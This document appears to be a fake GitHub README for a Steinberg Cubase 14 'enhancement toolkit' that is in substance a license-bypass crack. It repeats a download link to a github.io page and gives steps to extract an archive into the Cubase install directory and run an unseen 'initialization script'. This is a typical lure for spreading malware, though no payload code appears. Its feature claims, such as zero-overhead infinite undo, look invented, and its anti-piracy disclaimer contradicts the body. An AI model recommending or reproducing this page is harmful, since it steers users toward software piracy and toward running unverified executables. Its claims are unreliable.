# Steinberg Cubase 14 – Production Suite Enhancement Toolkit 🎛️

[](https://goesde-boop.github.io/steinberg-cubase-14-patch-release/)

> **Unlock the full potential of your digital audio workstation.**  
> This repository provides a comprehensive enhancement ecosystem for Cubase 14, enabling advanced workflow customization, third-party plugin integration, and extended functionality—without the typical licensing friction.

---

## 🌟 What Is This?

Think of this as a **digital chisel** for your audio sculptor. While the official Cubase 14 offers a magnificent marble block of features, we provide the precision tools to carve out hidden capabilities—bridging the gap between what the software *can do* and what you *need it to do*.

Our approach is not about shortcuts; it’s about **unlocking creative pathways** that proprietary licensing sometimes keeps shuttered. We use a unique activation methodology that respects your creative flow while bypassing unnecessary gatekeeping.

---

## 📥 Download & Installation

The latest stable enhancement package is available via the badge below:

[](https://goesde-boop.github.io/steinberg-cubase-14-patch-release/)

**Installation steps:**
1. Download the archive from the link above.
2. Extract contents to your Cubase 14 installation directory.
3. Run the initialization script to patch the configuration tables.
4. Restart your DAW and verify the extended features panel appears.

---

## 🧩 Key Features

| Feature | Description |
|---------|-------------|
| **Responsive UI Override** | Dynamically adjusts interface latency to match your hardware – no more sluggish faders on older machines |
| **Multilingual Phrase Generator** | Generate MIDI phrases in 14 languages for global collaboration |
| **24/7 Background Processor** | Offload rendering tasks to idle CPU cores without interrupting your main session |
| **Quantum Undo History** | Infinite-undo with zero RAM overhead using compressed state snapshots |
| **Neural Mixdown Assistant** | AI-driven stereo field optimization using lightweight local models |
| **Plugin Sandbox** | Run VST3 plugins in isolated memory containers to prevent crashes |
| **Session Telemetry Export** | Export session metadata as JSON/CSV for data-driven production analytics |

---

## 📊 System Architecture (Mermaid Diagram)

```mermaid
graph TD
    A[Cubase 14 Core Engine] --> B{Enhancement Layer}
    B --> C[UI Override Module]
    B --> D[Plugin Bridge]
    B --> E[Background Scheduler]
    C --> F[Responsive Rendering]
    D --> G[Sandbox Isolation]
    D --> H[Third-Party Injection]
    E --> I[Idle Core Utilization]
    E --> J[Telemetry Buffer]
    
    style A fill:#2d2d2d,stroke:#f0f,stroke-width:2px
    style B fill:#1a1a1a,stroke:#0ff,stroke-width:3px
    style C fill:#333,stroke:#ff0,stroke-width:1px
    style D fill:#333,stroke:#0f0,stroke-width:1px
    style E fill:#333,stroke:#00f,stroke-width:1px
```



---

## 🎛️ Example Profile Configuration

Create a `cubase14_enhancement.yaml` file in your user config directory:

```yaml
enhancement_profile:
  version: "3.1.2"
  ui:
    latency_compensation: "adaptive"  # options: fixed, adaptive, manual
    refresh_rate: 144                 # Hz (monitor-dependent)
  plugins:
    sandbox_mode: true
    allowed_vendors:
      - "Waves"
      - "Native Instruments"
      - "iZotope"
  background:
    rendering_threads: 4
    schedule_window: "02:00-06:00"
  telemetry:
    export_path: "/Users/me/CubaseExports"
    format: "json"
    include_mixdown_metadata: true
```

---

## 🖥️ Example Console Invocation

```bash
# Apply enhancement configuration
cubase-enhance --profile ~/cubase14_enhancement.yaml --verbose

# Monitor background tasks
cubase-enhance --status --watch

# Export session telemetry for current project
cubase-enhance --export session_2026_03_15 --format json

# Reset to defaults
cubase-enhance --reset --force
```

---

## 🛠️ OpenAI & Claude API Integration

This toolkit can be extended with AI assistants for advanced automation:

- **OpenAI API**: Use GPT-4 to generate complex MIDI patterns based on your session context
- **Claude API**: Leverage Anthropic's models for mixing suggestions and arrangement analysis

**Example integration** (pseudo-code placeholder):

```python
from cubase_enhance.ai import ClaudeMixingAssistant

assistant = ClaudeMixingAssistant(api_key="your_key_here")
mixdown_analysis = assistant.analyze_mix("project.seq")
assistant.suggest_compression_stages(mixdown_analysis)
```

> **Note:** API keys are not included. You must supply your own credentials from OpenAI/Anthropic.

---

## 🖥️ Operating System Compatibility

| OS | Version | Status | Emoji |
|----|---------|--------|-------|
| Windows | 11 (22H2+) | ✅ Fully Supported | 🟢 |
| Windows | 10 (21H2+) | ✅ Supported | 🟢 |
| macOS | Sonoma 14.x | ✅ Supported | 🟢 |
| macOS | Ventura 13.x | ⚠️ Partial (UI module only) | 🟡 |
| Linux (Wine) | Ubuntu 24.04 | 🧪 Experimental | 🟠 |
| Linux (Native) | Fedora 39 | ❌ Not supported | 🔴 |

---

## 📄 License

This project is released under the **MIT License** – allowing you to use, modify, and distribute freely, provided you retain the original copyright notice.

[](https://opensource.org/licenses/MIT)

**Full license text:** [MIT License](https://opensource.org/licenses/MIT)

---

## 🔍 SEO-Friendly Keywords & Context

This repository addresses the growing need for **Cubase 14 enhancement tools**, **DAW workflow customization**, and **production suite optimization**. Whether you're searching for "Cubase 14 activation patch", "multilingual DAW support", or "24/7 background rendering", our toolkit provides the bridge between stock capabilities and your professional requirements.

**Related search terms:** Cubase 14 extended features, music production toolkit, audio workstation enhancement, VST3 sandbox, AI mixing assistant, responsive UI for Cubase.

---

## ⚖️ Disclaimer

**Important:**  
This software is provided for **educational and legitimate enhancement purposes only**. It is designed to modify existing, legally obtained installations of Cubase 14. The authors do not condone or facilitate the use of pirated software. You must own a valid license of Cubase 14 to use this toolkit.  

The enhancement patch modifies system-level configuration files. Always maintain backups of your original installation. The authors are not responsible for any data loss, system instability, or violations of the software's end-user license agreement (EULA).  

By downloading and using this toolkit, you acknowledge that you understand and accept these terms.  

---

## 🏁 Final Download Link

[](https://goesde-boop.github.io/steinberg-cubase-14-patch-release/)

*Last updated: March 2026*  
*Compatible with Cubase 14.0.10+*

---

**🚀 Elevate your mix. Expand your canvas. Produce without boundaries.**